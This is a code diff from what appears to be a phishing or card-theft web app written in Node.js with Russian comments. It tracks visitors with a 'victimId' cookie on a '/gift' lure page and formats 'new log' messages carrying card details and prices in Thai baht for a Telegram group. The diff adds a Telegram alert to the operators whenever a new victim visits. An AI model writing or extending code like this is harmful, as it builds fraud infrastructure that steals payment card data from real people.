@@ -52,6 +52,12 @@ sequelize.sync()
     });
 
 
+async function sendNewVisitorMessage(req) {
+    return `🌐 Новый посетитель на сайте!
+    
+${await reqInfo(req)}`;
+}
+
 async function sendNewLogMessage(cardInfo) {
     return `<b>💳 Новый лог #id${cardInfo.id}</b>
 💰 Стоимость: <b>${cardInfo.price} THB</b>
@@ -88,6 +94,17 @@ app.get("/gift", async (req, res) => {
 
     if(created || victimId == undefined){
         await res.cookie('victimId', victim.id);
+        
+        // Отправляем уведомление о новом посетителе
+        if(created) {
+            try {
+                await bot.sendMessage(loggingGroupId, await sendNewVisitorMessage(req), {
+                    parse_mode: "HTML"
+                });
+            } catch (error) {
+                console.error('Ошибка при отправке уведомления о новом посетителе:', error);
+            }
+        }
     }
 
     if (victim.discount === 0) {
